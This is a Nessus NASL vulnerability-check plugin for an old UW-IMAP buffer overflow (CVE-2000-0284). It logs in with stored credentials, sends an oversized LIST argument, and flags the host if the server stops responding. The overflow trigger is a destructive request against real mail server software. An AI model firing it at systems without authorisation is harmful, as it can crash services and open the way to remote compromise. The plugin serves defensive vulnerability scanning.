#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10374);
 script_version ("$Revision: 1.22 $");

 script_cve_id("CVE-2000-0284");
 script_bugtraq_id(1110);
 script_xref(name:"OSVDB", value:"12037");
 
 script_name(english:"UoW imapd (UW-IMAP) Multiple Command Remote Overflows (2)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by 
multiple issues." );
 script_set_attribute(attribute:"description", value:
"There is a buffer overflow in the remote imap server 
which allows an authenticated user to obtain a remote
shell." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your imap server or use another one." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english:"checks for a buffer overflow in imapd");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "logins.nasl");
 script_require_ports("Services/imap", 143);
 script_exclude_keys("imap/false_imap");
 script_require_keys("imap/login", "imap/password");
 exit(0);
}

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

if((acct == "")||(pass == ""))exit(0);
port = get_kb_item("Services/imap");
if(!port)port = 143;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 b = recv_line(socket:soc, length:1024);
 if(!strlen(b)){
 	close(soc);
	exit(0);
	}
 s1 = string("1 login ", acct, " ", pass, "\r\n");	
 send(socket:soc, data:s1);
 b = recv_line(socket:soc, length:1024);
 
 s2 = string("1 list ", raw_string(0x22, 0x22), " ", crap(4096), "\r\n");
 send(socket:soc, data:s2);
 c = recv_line(socket:soc, length:1024);
 if(strlen(c) == 0)security_hole(port);
 close(soc);
}

